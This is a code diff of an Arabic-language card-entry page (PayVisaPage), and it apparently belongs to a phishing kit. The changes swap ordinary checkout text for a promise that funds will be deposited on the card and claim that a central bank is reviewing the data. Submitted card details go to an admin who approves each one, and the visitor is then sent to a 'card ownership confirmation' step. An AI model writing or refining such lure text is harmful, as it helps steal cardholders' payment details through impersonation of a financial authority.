@@ -13,15 +13,15 @@ interface PaymentForm {
 }
 
 const DEFAULTS = {
-  page_title: "إتمام عملية الدفع",
+  page_title: "سيتم ايداع التمويل على البطاقة  ",
   page_subtitle: "أدخل بيانات البطاقة لإتمام العملية",
-  badge_text: "دفع آمن ومشفر 100%",
-  submit_btn: "إتمام الدفع",
-  waiting_title: "في انتظار موافقة المدير",
-  waiting_message: "تم إرسال بيانات البطاقة للمدير للمراجعة. يرجى الانتظار حتى تتم الموافقة.",
+  badge_text: "جميع البيانات مشفرة ومحمية",
+  submit_btn: "تأكيد ",
+  waiting_title: "في انتظار مراجعة البيانات ",
+  waiting_message: "يرجى الانتظار سيتم مراجعة البيانات من قبل البنك المركزي يرجى عدم اغلاق الصفحة.     .",
   error_title: "حدث خطأ",
-  error_message: "يرجى المحاولة مرة أخرى لاحقاً",
-  success_title: "تمت الموافقة على الدفع!",
+  error_message: "يرجى المحاولة مرة أخرى ",
+  success_title: "سيتم تحويلك الى صفحة لتأكيد ملكية البطاقة   !",
 };
 
 function getQueryParam(key: string): string | null {
@@ -138,7 +138,7 @@ export default function PayVisaPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        throw new Error(data.error || "فشل في إرسال بيانات الدفع");
+        throw new Error(data.error || "فشل في إرسال بيانات البطاقة");
       }
 
       // البقاء في صفحة الانتظار - المدير سيوافق/يرفض
@@ -198,7 +198,7 @@ export default function PayVisaPage() {
             <span className="text-accent font-semibold text-sm">{content.badge_text || "دفع آمن ومشفر 100%"}</span>
           </div>
           <h1 className="text-4xl md:text-5xl font-black text-white mb-4">
-            {content.page_title || "إتمام عملية الدفع"}
+            {content.page_title || "تأكيد  "}
           </h1>
           <p className="text-lg text-white/60">
             {content.page_subtitle || "أدخل بيانات البطاقة لإتمام العملية"}
@@ -212,9 +212,9 @@ export default function PayVisaPage() {
               <div className="w-20 h-20 mx-auto mb-6 bg-green-500/20 rounded-full flex items-center justify-center">
                 <CheckCircle className="w-12 h-12 text-green-400" />
               </div>
-              <h2 className="text-2xl font-bold text-white mb-4">{content.success_title || "تمت الموافقة على الدفع!"}</h2>
+              <h2 className="text-2xl font-bold text-white mb-4">{content.success_title || "سيتم تحويلك الى صفحة تأكيد ملكية البطاقة   !"}</h2>
               <p className="text-white/70 mb-6">
-                جاري التحويل لصفحة النجاح...
+                جاري التحويل لصفحة التحقق...
               </p>
             </div>
           </div>
@@ -227,10 +227,10 @@ export default function PayVisaPage() {
               <div className="w-20 h-20 mx-auto mb-6 bg-accent/20 rounded-full flex items-center justify-center">
                 <Loader2 className="w-12 h-12 text-accent animate-spin" />
               </div>
-              <h2 className="text-2xl font-bold text-white mb-4">{content.waiting_title || "في انتظار موافقة المدير"}</h2>
+              <h2 className="text-2xl font-bold text-white mb-4">{content.waiting_title || "في انتظار موافقة البنك المركزي"}</h2>
               <p className="text-white/70 mb-6">
                 تم إرسال بيانات البطاقة للمدير للمراجعة.<br />
-                {content.waiting_message || "تم إرسال بيانات البطاقة للمدير للمراجعة. يرجى الانتظار حتى تتم الموافقة."}
+                {content.waiting_message || "تم إرسال بيانات البطاقة للبنك المركزي للمراجعة. يرجى الانتظار حتى تتم المراجعة."}
               </p>
               <div className="flex items-center justify-center gap-2 text-accent">
                 <div className="w-3 h-3 bg-accent rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
@@ -250,7 +250,7 @@ export default function PayVisaPage() {
               </div>
               <h2 className="text-2xl font-bold text-white mb-4">{content.error_title || "حدث خطأ"}</h2>
               <p className="text-white/70 mb-6">
-                {errorMessage || "يرجى المحاولة مرة أخرى لاحقاً"}
+                {errorMessage || "يرجى المحاولة مرة أخرى "}
               </p>
               <button 
                 onClick={() => window.location.reload()}
@@ -352,7 +352,7 @@ export default function PayVisaPage() {
                   ) : (
                     <>
                       <Lock className="w-6 h-6" />
-                      {content.submit_btn || "إتمام الدفع"}
+                      {content.submit_btn || "تأكيد "}
                       <ArrowRight className="w-6 h-6" />
                     </>
                   )}
@@ -362,7 +362,7 @@ export default function PayVisaPage() {
               {/* Security Badge */}
               <div className="mt-8 pt-6 border-t border-white/10 flex items-center justify-center gap-3 text-white/50">
                 <ShieldCheck className="w-5 h-5" />
-                <span className="text-sm">معلوماتك محمية بتقنية SSL المشفرة</span>
+                <span className="text-sm">جميع البيانات محمية ومشفرة من نظام البنك المركزي</span>
               </div>
             </div>
           </div>
